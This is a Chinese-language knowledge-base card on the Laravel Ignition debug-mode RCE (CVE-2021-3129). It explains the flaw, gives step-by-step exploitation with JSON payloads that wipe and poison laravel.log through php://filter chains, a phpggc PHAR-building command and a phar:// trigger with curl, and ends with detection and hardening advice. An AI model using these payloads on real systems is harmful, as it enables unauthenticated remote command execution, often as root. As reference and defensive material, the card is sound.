---
id: web-php-framework-laravel-ignition-debug-log-phar-rce
title: Laravel Ignition debug 模式 RCE：日志写入 PHAR + php://filter 解码（CVE-2021-3129）
type: scenario
domain: web
path: web/php/framework
technique: laravel-ignition-debug-log-phar-rce
tags:
- php
- laravel
- ignition
- deserialization
- phar
- log-poisoning
- rce
- debug-mode
cve:
- CVE-2021-3129
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Ignition < 2.5.2；Laravel < 8.4.2（debug mode）
verification:
  verified_by: verifier-V63
  verified_at: '2026-11-05T12:02:22+08:00'
  notes: 已对照原文与 NVD 截图核对：Ignition < 2.5.2、Laravel < 8.4.2 + debug、/_ignition/health-check 回显 can_execute_commands、MakeViewVariableOptionalSolution 的 viewFile stream wrapper、三重 base64-decode 清日志、UTF-16LE+QP 编码、phar:// 触发与 SHA1 签名对齐、最终 uid=0(root) 均与原文一致。已把卡内“AA 解码为两个 NUL 字节”修正为“产生 NUL 字节（2 个 base64 字符只够还原 1 个字节）”。未验证点：PoC 未在本机执行。
url: /docs/web/php/framework/web-php-framework-laravel-ignition-debug-log-phar-rce/
draft: false
kb_aliases:
- CVE-2021-3129
- Laravel debug RCE
- Ignition MakeViewVariableOptionalSolution
- php://filter 清日志
- phar:// 反序列化
- phpggc monolog/rce1
---

## 一句话结论

Laravel 开启 debug 且使用 Ignition < 2.5.2 时，`/_ignition/execute-solution` 可调用 `MakeViewVariableOptionalSolution`，其 `viewFile` 参数未经校验就进入 `file_get_contents`/`file_put_contents` 并支持 Stream Wrapper；攻击者先用 `php://filter/write=convert.base64-decode` 清空 `laravel.log`，再把 PHPGGC 生成的 PHAR 数据以 UTF-16LE+Quoted-Printable 形式写进日志，借助 `php://filter` 解码还原，最后用 `phar://` 触发反序列化，获得 Laravel 进程权限（原文环境为 root）的命令执行。

## 原理

- 触发面：Laravel debug 模式下 Ignition 注册 `_ignition/health-check`、`_ignition/execute-solution` 等路由；`health-check` 返回 `{"can_execute_commands":true}` 即确认可执行 solution。
- `ExecuteSolutionController` 接收 `solution` 与 `parameters`，通过 `SolutionProviderRepository` 实例化指定类并调用 `run()`；`MakeViewVariableOptionalSolution` 实现了 `RunnableSolution`：
  ```php
  public function run(array $parameters = []) {
      $output = $this->makeOptional($parameters);
      if ($output !== false) {
          file_put_contents($parameters['viewFile'], $output);
      }
  }
  public function makeOptional(array $parameters = []) {
      $originalContents = file_get_contents($parameters['viewFile']);
      $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ?? ''", $originalContents);
      // token_get_all 对比替换前后 token，不一致返回 false
  }
  ```
  `viewFile` 完全可控且支持 `php://filter`、`phar://`、`file://` 等 wrapper；读取在写入之前，若读取失败则不会写入。
- 为什么不能直接写 PHAR：`file_get_contents` 读到的内容会经过 `str_replace` 与 token 对比；直接写入 PHAR 二进制会让 token 校验失败，`run()` 不会执行 `file_put_contents`。因此需要"读一个能报错但能把内容写进日志"的路径——日志文件天然满足：报错信息会被 Laravel 写入 `storage/logs/laravel.log`。
- 清空日志：`php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=laravel.log`。`write=` 方向只在写入阶段应用过滤器；`convert.base64-decode` 会把写入数据中的非法 base64 字符丢弃（有时报 `invalid byte sequence`），多次解码把旧日志"洗掉"，通常需要重复请求几次。
- 写入对齐：先写 `viewFile="AA"`，`file_get_contents("AA")` 报错，日志里留下 `AA`；`AA` 是合法 base64，解码产生 NUL 字节（2 个 base64 字符只够还原 1 个字节），用于在日志噪音和 PHAR 数据之间做分隔/对齐。
- 编码 PHAR：用 PHPGGC 生成 `monolog/rce1` 链的 PHAR，再 `base64 -w0` 后对每个字符插入 `=00`（即 UTF-16LE 编码 + Quoted-Printable 表示）。这样做的原因：
  - 每个 base64 字符后跟一个 NUL，Blade 编译器不处理 NUL，token 校验不会被破坏；
  - 日志前缀是普通 ASCII，没有成对的 NUL，经过 UTF-16LE→UTF-8 转换会变成乱码/被丢弃；payload 的"字符+NUL"配对则还原为原始 base64。
- 写入 payload：把上面那串 `P=00D=009=00...` 作为 `viewFile` 提交；`file_get_contents` 因"文件名太长"报错，错误信息把整串 payload 写进日志。
- 解码还原：`php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=laravel.log`。第一层 QP 解码把 `=00` 还原为 NUL；第二层 UTF-16LE→UTF-8 让"字符+NUL"还原为字符、破坏无 NUL 的日志前缀；第三层 base64 解码还原 PHAR 二进制。
- 触发反序列化：`phar:///path/laravel.log/test.txt`。PHP 在 `file_get_contents` 打开 phar 时会读取 PHAR metadata 并反序列化，触发 `monolog/rce1` 链执行命令。
- 对齐问题：PHAR 末尾有 SHA1 签名；日志前缀解码后产生的乱码字节会让 PHAR 整体偏移，报 `phar SHA1 signature could not be verified: broken signature`。解决方法是给编码后的 payload 末尾逐个追加 `=00`（解码后即 NUL 填充），反复重试直到签名校验通过。
- 为什么危害大：Ignition 路由无需认证；`viewFile` 的 wrapper 能力把"文件读写"升级为"任意流操作 + PHAR 反序列化"；Laravel 常以较高权限运行（原文为 root），RCE 即 root。

## 触发条件

- Laravel < 8.4.2 且 Ignition < 2.5.2，`APP_DEBUG=true`。
- `/_ignition/execute-solution` 可从攻击面访问，`enableRunnableSolutions` 未被关闭。
- 能确定 `storage/logs/laravel.log` 的绝对路径（开源项目路径固定，或通过报错泄露）。
- PHP 允许 `phar://`、`php://filter` wrapper，且日志文件可写。
- 若 Laravel 以 root 运行，则直接获得 root；否则为 Web 进程权限。

## 利用步骤

1. 确认 debug：访问一个会报错的路径（如 `/profiles`），出现 Ignition 调试页；`curl /_ignition/health-check` 返回 `{"can_execute_commands":true}`。
2. 推断日志路径：`<project>/storage/logs/laravel.log`，可通过报错页的 `file`/`trace` 或项目结构确认。
3. 清空日志（可重复多次）：
   `viewFile = php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=<log>`
4. 写入 `AA` 对齐。
5. 用 PHPGGC 生成 PHAR 并编码：
   `php -d 'phar.readonly=0' phpggc monolog/rce1 system '<cmd>' --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g'`
6. 把编码串作为 `viewFile` 提交，制造"文件名太长"报错，把 payload 写入日志。
7. 解码：`viewFile = php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=<log>`
8. 触发：`viewFile = phar://<log>/test.txt`；若签名错误，给编码串末尾追加 `=00` 后重跑 3-8，直到对齐。
9. 命令执行（原文输出 `uid=0(root)`），读取 root flag / 反弹 Shell。

## PoC

清空日志：

```json
{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "cm0s",
    "viewFile": "php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/home/developer/myproject/storage/logs/laravel.log"
  }
}
```

写入对齐：

```json
{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {"variableName": "cm0s", "viewFile": "AA"}
}
```

生成并编码 PHAR：

```bash
php -d 'phar.readonly=0' ./phpggc monolog/rce1 system 'id' \
  --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g' > payload.txt
# payload.txt 形如 P=00D=009=00w=00a=00H=00A=00g=00...
```

写入与解码：

```json
{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"cm0s","viewFile":"<payload.txt 内容>"}}
```

```json
{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"cm0s","viewFile":"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/home/developer/myproject/storage/logs/laravel.log"}}
```

触发：

```json
{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"cm0s","viewFile":"phar:///home/developer/myproject/storage/logs/laravel.log/test.txt"}}
```

```bash
curl -s http://127.0.0.1:8000/_ignition/execute-solution \
  -X POST -H 'Content-Type: application/json' --data @rce.json
# uid=0(root) gid=0(root) groups=0(root)
```

说明：PoC 为原文流程的结构化复现，未在本机执行；实际利用可参考公开的自动化 exp。

## 变体与关联

- 变体：PHAR 链可用 `phpggc monolog/rce1`、`laravel/rce*` 等，取决于目标依赖；`system` 可换成 `exec`/`passthru`/反弹 Shell。
- 变体：日志路径不同（`storage/logs/laravel.log`、`var/log/laravel.log`）；可通过报错页或 `php://filter/resource=...` 探测。
- 变体：清空日志的 filter 链可调整（重复次数、`convert.iconv` 组合）；不同 PHP 版本对 `convert.base64-decode` 的容错不同。
- 变体：无回显时可用时间盲注或写文件；`phar://` 触发需要 `phar.readonly=0` 仅用于生成端，目标端只读即可。
- 关联：[[web-php-deserialization-compressed-phar-include-bypass]]（PHAR 反序列化的通用形态）；[[web-php-framework-livewire-cve-2025-54068-snapshot-hydration-rce]]（Laravel 生态另一条 RCE）；[[web-nodejs-strapi-plugin-install-command-injection]]（同一靶机的前一跳）。
- 边界：生产环境关闭 debug、升级 Ignition 2.5.2+/Laravel 8.4.2+、禁用 `phar://`/`php://filter`、日志不可写或路径不可知时，本链不成立。

## 检测与防御

- 检测：访问 `/_ignition/health-check`、`/_ignition/execute-solution`；请求体中出现 `Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution`、`php://filter`、`phar://`、`convert.base64-decode`、`convert.quoted-printable-decode`、`convert.iconv.utf-16le.utf-8`。
- 检测：`laravel.log` 中出现大量 `=00` 编码串、PHAR 二进制或 `file_get_contents(...): failed` 的异常长文件名；日志被异常清空/重写。
- 防御：生产环境设置 `APP_DEBUG=false`；升级 Laravel 到 8.4.2+、Ignition 到 2.5.2+；关闭 `enableRunnableSolutions`。
- 加固：PHP 禁用不必要的 `phar://` wrapper（或使用 `phar.readonly=1` 并限制反序列化）、限制 `php://filter` 的滥用；Web 进程以低权限运行；日志目录权限最小化并做完整性监控。

